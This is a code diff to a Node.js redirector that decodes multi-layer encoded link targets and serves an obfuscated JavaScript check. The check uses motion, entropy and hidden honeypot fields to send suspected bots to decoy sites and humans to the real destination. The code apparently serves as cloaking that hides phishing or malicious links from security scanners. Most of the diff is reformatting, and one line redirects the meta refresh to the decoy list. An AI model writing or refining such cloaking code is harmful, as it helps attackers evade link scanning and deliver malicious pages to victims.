@@ -91,7 +91,7 @@ async function getCountryCode(req) {
     const token = process.env.IPINFO_TOKEN;
     if (!token) return 'XX';
 
-    const res = await fetch(`https://ipinfo.io/${ip}/json?token=${token}`, {  // ← FIXED: /json instead of /country
+    const res = await fetch(`https://ipinfo.io/${ip}/json?token=${token}`, {
       timeout: 3500,
       headers: { 'User-Agent': 'redir/1.0' }
     });
@@ -177,10 +177,7 @@ function multiLayerEncode(str) {
 
 function multiLayerDecode(encoded, layers) {
   let result;
-  try { result = Buffer.from(encoded, 'base64url').toString('utf8'); } catch {
-    console.log('[DECODE-ERR] base64url failed');
-    return null;
-  }
+  try { result = Buffer.from(encoded, 'base64url').toString('utf8'); } catch { console.log('[DECODE-ERR] base64url failed'); return null; }
 
   const parts = result.split('|');
   if (parts.length >= 3) {
@@ -195,10 +192,7 @@ function multiLayerDecode(encoded, layers) {
   for (const { name, key } of layers) {
     const layer = encoders.find(e => e.name === name);
     if (!layer) continue;
-    try { result = key ? layer.dec(result, key) : layer.dec(result); } catch {
-      console.log(`[DECODE-ERR] layer ${name} failed`);
-      return null;
-    }
+    try { result = key ? layer.dec(result, key) : layer.dec(result); } catch { console.log(`[DECODE-ERR] layer ${name} failed`); return null; }
   }
 
   const noiseGuess = Math.floor(result.length * 0.07);
@@ -249,8 +243,7 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
 
   const hpSuffix = crypto.randomBytes(5).toString('hex');
 
-  const rawChallenge = `
-  (function(){
+  const rawChallenge = `(function(){
     const T = '${data.target.replace(/'/g,"\\'")}';
     const B = '${BOT_URLS[0]}';
 
@@ -295,8 +288,7 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
       console.log(\`[CHECK] mob:\${mob} ent:\${ent.toFixed(1)} mov:\${moves} tilt:\${tiltE.toFixed(1)} comp:\${compE.toFixed(1)} mot:\${mot} hp:\${hpFilled()?'FILLED':'clean'} → \${sus?'BOT':'PASS'}\`);
       location = sus ? B : T;
     },950+Math.random()*1050);
-  })();
-  `;
+  })();`;
 
   const obfJS = JavaScriptObfuscator.obfuscate(rawChallenge, {
     compact: true,
@@ -319,42 +311,13 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <meta http-equiv="refresh" content="8;url=https://www.microsoft.com">
+  <meta http-equiv="refresh" content="8;url=${BOT_URLS[0]}">
   <title>Verifying...</title>
   <style>
-    body {
-      margin: 0;
-      background: #000;
-      color: #aaa;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: sans-serif;
-    }
-    .visually-hidden {
-      position: absolute !important;
-      width: 1px !important;
-      height: 1px !important;
-      padding: 0 !important;
-      margin: -1px !important;
-      overflow: hidden !important;
-      clip: rect(0,0,0,0) !important;
-      border: 0 !important;
-    }
-    .spinner {
-      border: 4px solid #333;
-      border-top: 4px solid #0f0;
-      border-radius: 50%;
-      width: 32px;
-      height: 32px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+    body{margin:0;background:#000;color:#aaa;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;}
+    .visually-hidden{position:absolute !important;width:1px !important;height:1px !important;padding:0 !important;margin:-1px !important;overflow:hidden !important;clip:rect(0,0,0,0) !important;border:0 !important;}
+    .spinner {border:4px solid #333;border-top:4px solid #0f0;border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;margin:20px auto;}
+    @keyframes spin {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
   </style>
 </head>
 <body>
@@ -363,7 +326,6 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
     <p>Verifying request… please wait</p>
   </div>
 
-  <!-- Randomized honeypot fields – server & client both check these -->
   <div class="visually-hidden">
     <input type="text" id="hp_n_${hpSuffix}" autocomplete="off" tabindex="-1">
     <input type="email" id="hp_e_${hpSuffix}" autocomplete="off" tabindex="-1">
@@ -371,11 +333,9 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
     <input type="checkbox" id="hp_c_${hpSuffix}" tabindex="-1">
   </div>
 
-  <script nonce="${res.locals.nonce}">
-    ${obfJS}
-  </script>
+  <script nonce="${res.locals.nonce}">${obfJS}</script>
 </body>
-</html>);
+</html>`);
 });
 
 app.use((_, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));
